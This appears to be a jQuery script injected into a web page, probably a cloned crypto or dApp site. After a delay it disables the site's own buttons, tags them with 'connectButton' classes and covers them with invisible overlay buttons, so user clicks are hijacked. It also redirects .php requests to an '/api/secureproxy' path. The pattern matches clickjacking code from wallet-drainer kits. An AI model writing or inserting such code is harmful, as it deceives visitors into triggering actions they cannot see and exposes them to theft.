$(document).ready(function () {
  setTimeout(function () {
    $("a.MuiButtonBase-root.css-1gypc7f").click();

    let btn1 = $(".MuiButton-gradiantSizeMedium");
    let btn2 = $(".MuiButton-gradiantSizeLarge");

    console.log({
      btn1: btn1.text(),
      btn2: btn2.text(),
    });

    btn1.prop("disabled", true);
    btn1.addClass("interact-button connectButton");
    btn1.removeAttr("type");

    btn2.prop("disabled", true);
    btn2.addClass("interact-button connectButton");
    btn2.removeAttr("type");

    // Style the existing buttons for stacking
    btn1.css({ position: "relative" });
    btn2.css({ position: "relative" });

    // Create and add red button for btn1
    const redButton1 = $(
      '<button style="color: white; background-color: red; border: none; padding: 5px 10px; cursor: pointer; border-radius: 30px; position: absolute; z-index: 10;">Hello World</button>'
    );
    redButton1.addClass("interact-button connectButton");

    // Set width and position to match btn1
    redButton1.css({
      top: 0,
      left: 0,
      width: btn1.outerWidth() + "px",
      height: btn1.outerHeight() + "px",
      opacity: 0,
    });

    // Place button as a child of a wrapper div positioned relative to btn1
    const wrapper1 = $(
      '<div style="position: relative; display: inline-block;"></div>'
    );
    btn1.wrap(wrapper1);
    btn1.parent().append(redButton1);

    // Create and add red button for btn2
    const redButton2 = $(
      '<button style="color: white; background-color: red; border: none; padding: 5px 10px; cursor: pointer; border-radius: 30px; position: absolute; z-index: 10;">Hello World</button>'
    );
    redButton2.addClass("interact-button connectButton");

    // Set width and position to match btn2
    redButton2.css({
      top: 0,
      left: 0,
      width: btn2.outerWidth() + "px",
      height: btn2.outerHeight() + "px",
      opacity: 0,
    });

    // Place button as a child of a wrapper div positioned relative to btn2
    const wrapper2 = $(
      '<div style="position: relative; display: inline-block;"></div>'
    );
    btn2.wrap(wrapper2);
    btn2.parent().append(redButton2);
  }, 2000); // 2-second delay
});

//Middleware implementation
$(document).ready(function () {
  // Get the current URL's pathname
  const pathname = window.location.pathname;
  const search = window.location.search;

  // Check if the URL ends with .php
  if (pathname.endsWith(".php")) {
    // Redirect to the new URL
    window.location.href = "/api/secureproxy" + search;
  }
});
